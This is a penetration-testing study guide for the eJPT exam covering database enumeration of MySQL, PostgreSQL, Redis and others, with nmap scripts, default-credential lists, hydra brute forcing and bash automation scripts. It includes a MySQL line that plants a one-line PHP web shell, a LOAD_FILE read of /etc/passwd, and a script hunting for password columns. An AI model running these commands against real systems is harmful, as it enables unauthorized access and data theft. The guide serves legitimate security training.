# 🔧 Database Enumeration - SQL and NoSQL Database Analysis

Database enumeration involves discovering database services, testing authentication, enumerating databases and tables, and identifying potential SQL injection points.
**Location:** `05-service-enumeration/database-enumeration.md`

## 🎯 What is Database Enumeration?

Database enumeration is the systematic process of identifying and analyzing database services to understand their structure, content, and security posture. Key capabilities include:
- Database service discovery and version detection
- Authentication testing and user enumeration
- Database and schema discovery
- Table and column enumeration
- Privilege escalation opportunities identification
- SQL injection vulnerability assessment

## 📦 Installation and Setup

### Prerequisites:
- Database client tools for various database types
- Network scanning tools with database scripts
- SQL injection testing tools

### Installation:
```bash
# Install database clients
apt update && apt install mysql-client postgresql-client redis-tools mongodb-clients

# Install enumeration tools
apt install sqlmap nmap hydra

# Verify installations
mysql --version
psql --version
redis-cli --version
```

### Common Database Ports:
```bash
# Standard database ports to scan
3306  # MySQL/MariaDB
5432  # PostgreSQL  
1433  # Microsoft SQL Server
1521  # Oracle
6379  # Redis
27017 # MongoDB
5984  # CouchDB
```

## 🔧 Basic Usage and Syntax

### Basic Workflow:
1. **Service Discovery:** Identify database services on target
2. **Version Detection:** Determine database type and version
3. **Authentication Testing:** Test for default/weak credentials
4. **Database Enumeration:** List accessible databases
5. **Schema Discovery:** Enumerate tables and columns
6. **Data Extraction:** Access sensitive information

### Command Structure:
```bash
# Database service discovery
nmap -p 3306,5432,1433,1521,6379,27017 -sV target

# MySQL connection testing
mysql -h target -u root -p

# PostgreSQL connection testing
psql -h target -U postgres
```

## ⚙️ Command Line Options

### Nmap Database Scripts:
| Script | Purpose | Example |
|--------|---------|---------|
| `mysql-info` | MySQL server information | `nmap --script mysql-info -p 3306 target` |
| `mysql-empty-password` | Test for empty passwords | `nmap --script mysql-empty-password -p 3306 target` |
| `postgres-info` | PostgreSQL information | `nmap --script pgsql-brute -p 5432 target` |
| `redis-info` | Redis server information | `nmap --script redis-info -p 6379 target` |

### MySQL Client Options:
| Option | Purpose | Example |
|--------|---------|---------|
| `-h host` | Specify host | `mysql -h target -u root -p` |
| `-u user` | Username | `mysql -h target -u admin -p` |
| `-p` | Prompt for password | `mysql -h target -u root -p` |
| `-e "query"` | Execute query | `mysql -h target -u root -p -e "SHOW DATABASES;"` |

### PostgreSQL Client Options:
| Option | Purpose | Example |
|--------|---------|---------|
| `-h host` | Specify host | `psql -h target -U postgres` |
| `-U user` | Username | `psql -h target -U admin` |
| `-d database` | Database name | `psql -h target -U postgres -d testdb` |
| `-c "query"` | Execute command | `psql -h target -U postgres -c "\l"` |

## 🧪 Real Lab Examples

### Example 1: MySQL Service Discovery and Enumeration
```bash
# Step 1: Discover MySQL service
nmap -p 3306 -sV target
# Output: 3306/tcp open mysql MySQL 5.7.x

# Step 2: Test for information disclosure
nmap --script mysql-info -p 3306 target
# Output: MySQL version, capabilities, and configuration

# Step 3: Test authentication
nmap --script mysql-empty-password -p 3306 target
# Output: Accounts with empty passwords

# Step 4: Manual connection testing
mysql -h target -u root -p
# Try common passwords: root, admin, password, blank

# Step 5: Database enumeration (if successful)
SHOW DATABASES;
USE database_name;
SHOW TABLES;
DESCRIBE table_name;
```

### Example 2: PostgreSQL Enumeration
```bash
# PostgreSQL service discovery
nmap -p 5432 -sV target  
# Output: 5432/tcp open postgresql PostgreSQL DB 9.6.x

# Information gathering
nmap --script pgsql-brute -p 5432 target

# Manual connection
psql -h target -U postgres
# Common users: postgres, admin, user

# Database enumeration
\l                          # List databases
\c database_name           # Connect to database  
\dt                        # List tables
\d table_name             # Describe table
```

### Example 3: Redis Enumeration
```bash
# Redis service discovery
nmap -p 6379 -sV target
# Output: 6379/tcp open redis Redis key-value store

# Information gathering
nmap --script redis-info -p 6379 target

# Manual connection (often no authentication)
redis-cli -h target
# Redis commands:
INFO                       # Server information
CONFIG GET *              # Configuration
KEYS *                    # List all keys
GET key_name              # Get key value
```

## 🎯 eJPT Exam Focus

### Essential Skills for eJPT:
- **Service identification (30%)** - Recognizing database services and versions
- **Authentication testing (30%)** - Testing default credentials and weak passwords
- **Database enumeration (25%)** - Listing databases, tables, and data
- **Vulnerability identification (15%)** - Finding SQL injection and misconfigurations

### Critical Commands to Master:
```bash
# Must-know commands for exam
nmap -p 3306,5432,1433 -sV target                    # Database service discovery
mysql -h target -u root -p                           # MySQL connection
psql -h target -U postgres                           # PostgreSQL connection
redis-cli -h target                                  # Redis connection
SHOW DATABASES; SHOW TABLES;                         # MySQL enumeration
```

### eJPT Exam Scenarios:
1. **Database Service Discovery:** Find and identify database services
   - Required skills: Port scanning, service identification
   - Expected commands: nmap with database port ranges
   - Success criteria: Identify database types and versions

2. **Database Access and Enumeration:** Gain access and enumerate contents
   - Required skills: Authentication testing, SQL commands
   - Expected commands: Database client connections, enumeration queries
   - Success criteria: List databases, tables, and sensitive data

### Exam Tips and Tricks:
- **Test common credentials:** root/root, admin/admin, postgres/postgres
- **Check for anonymous access:** Many databases allow guest connections
- **Document version information:** Older versions have known vulnerabilities
- **Use NSE scripts:** Automate common enumeration tasks

### Common eJPT Questions:
- Identify database services running on target systems
- Test for default database credentials and gain access
- Enumerate database contents to find sensitive information

## ⚠️ Common Issues & Troubleshooting

### Issue 1: Connection Refused or Filtered
**Problem:** Cannot connect to database service
**Cause:** Firewall blocking, service binding to localhost only
**Solution:**
```bash
# Verify service is running and accessible
nmap -p 3306 -sV target

# Check if service binds to specific interface
nmap -p 3306 --script mysql-info target

# Try alternative authentication methods
mysql -h target -u root --protocol=TCP
```

### Issue 2: Authentication Failures
**Problem:** Cannot authenticate to database
**Solution:**
```bash
# Test common usernames and passwords
mysql -h target -u root -p          # password: (blank)
mysql -h target -u root -proot      # password: root
mysql -h target -u admin -padmin    # password: admin

# Use hydra for brute force
hydra -L users.txt -P passwords.txt mysql://target
```

### Issue 3: Permission Denied for Commands
**Problem:** Authenticated but cannot execute enumeration commands
**Solution:**
```bash
# Check user privileges
SHOW GRANTS;                        # MySQL
SELECT current_user;               # PostgreSQL

# Try alternative enumeration methods
SELECT schema_name FROM information_schema.schemata;  # MySQL
SELECT datname FROM pg_database;                     # PostgreSQL
```

### Issue 4: Non-Standard Database Configurations
**Problem:** Database using non-standard ports or configurations
**Solution:**
```bash
# Scan extended port ranges
nmap -p 1-65535 target | grep -i mysql

# Check for database services on web ports
nmap --script http-enum -p 80,443,8080 target
```

## 🔗 Integration with Other Tools

### Primary Integration: Nmap → Database Clients → SQLMap
```bash
# Step 1: Discover database services
nmap -p 3306,5432,1433 -sV target

# Step 2: Test authentication and enumerate
mysql -h target -u root -p
SHOW DATABASES;

# Step 3: Test for SQL injection in web applications
sqlmap -u "http://target/app.php?id=1" --dbs
```

### Secondary Integration: Database Access → Privilege Escalation
```bash
# After gaining database access
mysql -h target -u root -p

# Check for file read/write capabilities
SELECT LOAD_FILE('/etc/passwd');     # MySQL file reading
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';  # Web shell
```

### Advanced Workflows:
```bash
# Comprehensive database enumeration pipeline
#!/bin/bash
target=$1

echo "=== Database Service Discovery ==="
nmap -p 1433,3306,5432,1521,6379,27017 -sV $target

echo "=== MySQL Enumeration ==="
if nmap -p 3306 $target | grep -q "open"; then
    nmap --script mysql-info,mysql-empty-password -p 3306 $target
fi

echo "=== PostgreSQL Enumeration ==="
if nmap -p 5432 $target | grep -q "open"; then
    nmap --script pgsql-brute -p 5432 $target
fi

echo "=== Redis Enumeration ==="
if nmap -p 6379 $target | grep -q "open"; then
    nmap --script redis-info -p 6379 $target
fi
```

## 📝 Documentation and Reporting

### Evidence Collection Requirements:
1. **Screenshots:** Database connection successes and enumeration results
2. **Command Outputs:** SQL queries and their results
3. **Database Schema:** Structure of discovered databases and tables
4. **Sensitive Data:** Examples of accessible sensitive information

### Report Template Structure:
```markdown
## Database Enumeration Results

### Target Information
- Target: 192.168.1.100
- Services: MySQL/3306, PostgreSQL/5432
- Date/Time: 2024-11-26 13:08 IST
- Authentication: Successful with default credentials

### Commands Executed
```bash
# Service discovery
nmap -p 3306,5432 -sV 192.168.1.100

# MySQL authentication testing
mysql -h 192.168.1.100 -u root -p

# Database enumeration
SHOW DATABASES;
USE webapp_db;
SHOW TABLES;
DESCRIBE users;
```

### Database Services Discovered
- **MySQL 5.7.33:** Port 3306/TCP
  - Authentication: root/(blank password)
  - Databases: information_schema, mysql, performance_schema, webapp_db
  - Critical Tables: users, admin, payments

- **PostgreSQL 12.8:** Port 5432/TCP  
  - Authentication: postgres/postgres
  - Databases: postgres, template0, template1, company_db
  - Critical Tables: employees, salaries, customer_data

### Security Findings
- **Default Credentials:** Both MySQL and PostgreSQL using default passwords
- **Sensitive Data Exposure:** User credentials stored in plaintext
- **Excessive Privileges:** Database users have administrative access
- **No Encryption:** Database connections not encrypted

### Extracted Sensitive Data
- User account information (usernames, passwords, emails)
- Administrative credentials for web applications
- Customer personal information and payment data
- Internal employee salary and contact information

### Attack Vectors Identified
- **Privilege Escalation:** Database admin access enables system compromise
- **Data Exfiltration:** Complete customer and employee databases accessible
- **Web Shell Upload:** File write permissions allow web shell deployment
- **Lateral Movement:** Database credentials may be reused on other systems

### Recommendations
- Change default database passwords immediately
- Implement proper user access controls and privilege separation
- Enable database connection encryption (SSL/TLS)
- Encrypt sensitive data at rest
- Regular database security audits and access monitoring
- Remove unnecessary databases and test data from production systems
```

### Automation Scripts:
```bash
# Database enumeration automation script
#!/bin/bash
TARGET=$1
OUTPUT_DIR="db-enum-$(date +%Y%m%d-%H%M%S)"
mkdir $OUTPUT_DIR

echo "Starting database enumeration of $TARGET"

# Database service discovery
echo "[+] Discovering database services..."
nmap -p 1433,3306,5432,1521,6379,27017,5984 -sV $TARGET > $OUTPUT_DIR/service_discovery.txt

# MySQL enumeration
if grep -q "3306.*mysql" $OUTPUT_DIR/service_discovery.txt; then
    echo "[+] Enumerating MySQL..."
    nmap --script mysql-info,mysql-empty-password,mysql-users,mysql-databases -p 3306 $TARGET > $OUTPUT_DIR/mysql_enum.txt
    
    # Test common MySQL credentials
    for user in root admin mysql; do
        for pass in "" root admin mysql password 123456; do
            echo "Testing MySQL $user:$pass" >> $OUTPUT_DIR/mysql_auth.txt
            timeout 5 mysql -h $TARGET -u $user -p$pass -e "SELECT USER();" >> $OUTPUT_DIR/mysql_auth.txt 2>&1
        done
    done
fi

# PostgreSQL enumeration  
if grep -q "5432.*postgresql" $OUTPUT_DIR/service_discovery.txt; then
    echo "[+] Enumerating PostgreSQL..."
    nmap --script pgsql-brute -p 5432 $TARGET > $OUTPUT_DIR/pgsql_enum.txt
    
    # Test common PostgreSQL credentials
    for user in postgres admin user; do
        for pass in postgres admin user password ""; do
            echo "Testing PostgreSQL $user:$pass" >> $OUTPUT_DIR/pgsql_auth.txt
            timeout 5 psql -h $TARGET -U $user -c "\l" >> $OUTPUT_DIR/pgsql_auth.txt 2>&1
        done
    done
fi

# Redis enumeration
if grep -q "6379.*redis" $OUTPUT_DIR/service_discovery.txt; then
    echo "[+] Enumerating Redis..."
    nmap --script redis-info -p 6379 $TARGET > $OUTPUT_DIR/redis_enum.txt
    
    # Test Redis access (usually no auth)
    echo "[+] Testing Redis access..."
    timeout 5 redis-cli -h $TARGET info > $OUTPUT_DIR/redis_info.txt 2>&1
    timeout 5 redis-cli -h $TARGET config get "*" > $OUTPUT_DIR/redis_config.txt 2>&1
fi

# MongoDB enumeration
if grep -q "27017.*mongodb" $OUTPUT_DIR/service_discovery.txt; then
    echo "[+] Enumerating MongoDB..."
    nmap --script mongodb-info,mongodb-databases -p 27017 $TARGET > $OUTPUT_DIR/mongodb_enum.txt
fi

# Microsoft SQL Server enumeration
if grep -q "1433.*ms-sql" $OUTPUT_DIR/service_discovery.txt; then
    echo "[+] Enumerating MSSQL..."
    nmap --script ms-sql-info,ms-sql-empty-password -p 1433 $TARGET > $OUTPUT_DIR/mssql_enum.txt
fi

echo "[+] Database enumeration complete! Results in $OUTPUT_DIR/"

# Generate summary report
echo "[+] Generating summary..."
echo "=== DATABASE ENUMERATION SUMMARY ===" > $OUTPUT_DIR/summary.txt
echo "Target: $TARGET" >> $OUTPUT_DIR/summary.txt
echo "Date: $(date)" >> $OUTPUT_DIR/summary.txt
echo >> $OUTPUT_DIR/summary.txt

echo "Services Discovered:" >> $OUTPUT_DIR/summary.txt
grep -E "(mysql|postgresql|redis|mongodb|ms-sql)" $OUTPUT_DIR/service_discovery.txt >> $OUTPUT_DIR/summary.txt

if [ -f "$OUTPUT_DIR/mysql_auth.txt" ]; then
    echo >> $OUTPUT_DIR/summary.txt
    echo "MySQL Authentication Results:" >> $OUTPUT_DIR/summary.txt
    grep -i "success\|login\|user" $OUTPUT_DIR/mysql_auth.txt >> $OUTPUT_DIR/summary.txt
fi

if [ -f "$OUTPUT_DIR/pgsql_auth.txt" ]; then
    echo >> $OUTPUT_DIR/summary.txt
    echo "PostgreSQL Authentication Results:" >> $OUTPUT_DIR/summary.txt  
    grep -i "success\|login\|list" $OUTPUT_DIR/pgsql_auth.txt >> $OUTPUT_DIR/summary.txt
fi
```

### Advanced Database Exploitation Script:
```bash
# Advanced database exploitation and data extraction
#!/bin/bash
TARGET=$1
DB_TYPE=$2  # mysql, pgsql, redis, mongodb
USER=$3
PASS=$4

case $DB_TYPE in
    mysql)
        echo "[+] MySQL exploitation and data extraction..."
        mysql -h $TARGET -u $USER -p$PASS << EOF
SHOW DATABASES;
USE information_schema;
SELECT schema_name FROM schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys');
SELECT table_name FROM tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys');
SELECT column_name,table_name,table_schema FROM columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%user%' OR column_name LIKE '%email%';
EOF
        ;;
    pgsql)
        echo "[+] PostgreSQL exploitation and data extraction..."
        psql -h $TARGET -U $USER << EOF
\l
SELECT datname FROM pg_database WHERE datname NOT IN ('postgres','template0','template1');
\c target_database
\dt
SELECT column_name,table_name FROM information_schema.columns WHERE column_name ILIKE '%pass%' OR column_name ILIKE '%user%' OR column_name ILIKE '%email%';
EOF
        ;;
    redis)
        echo "[+] Redis exploitation and data extraction..."
        redis-cli -h $TARGET << EOF
INFO
CONFIG GET "*"
KEYS *
EOF
        ;;
esac
```

## 📚 Additional Resources

### Official Documentation:
- MySQL Documentation: https://dev.mysql.com/doc/
- PostgreSQL Documentation: https://www.postgresql.org/docs/
- Redis Documentation: https://redis.io/documentation
- MongoDB Documentation: https://docs.mongodb.com/

### Learning Resources:
- Database security fundamentals and best practices
- SQL injection techniques and prevention methods
- NoSQL database security considerations
- Database privilege escalation and post-exploitation techniques

### Community Resources:
- HackTricks Database enumeration: https://book.hacktricks.xyz/pentesting/pentesting-databases
- OWASP Database security guidelines
- Database penetration testing methodologies and case studies

### Related Tools:
- SQLMap: Advanced SQL injection and database takeover tool
- NoSQLMap: NoSQL injection testing framework
- Metasploit database modules: Database exploitation and post-exploitation
- Database assessment tools: DbVisualizer, HeidiSQL, pgAdmin
